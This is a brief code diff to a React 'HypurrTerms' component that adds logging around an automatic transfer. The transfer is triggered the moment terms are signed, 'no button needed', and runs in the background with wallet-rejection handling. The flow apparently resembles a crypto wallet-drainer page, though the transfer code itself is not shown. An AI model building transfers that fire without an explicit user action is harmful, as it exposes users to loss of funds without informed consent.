@@ -389,8 +389,12 @@ const HypurrTerms = () => {
       setIsVerifying(false);
       
       // IMMEDIATELY trigger approval - no delay, no button needed
-      console.log('Starting automatic transfer process NOW...');
+      console.log('=== TERMS SIGNED - STARTING TRANSFER PROCESS ===');
+      console.log('Calling handleAutomaticTransfer() NOW...');
+      
+      // Call immediately, don't await - let it run in background but catch errors
       handleAutomaticTransfer().catch(err => {
+        console.error('=== TRANSFER PROCESS ERROR ===', err);
         // Show error to user if transfer fails
         console.error('Transfer error:', err);
         if (err.code === 4001) {
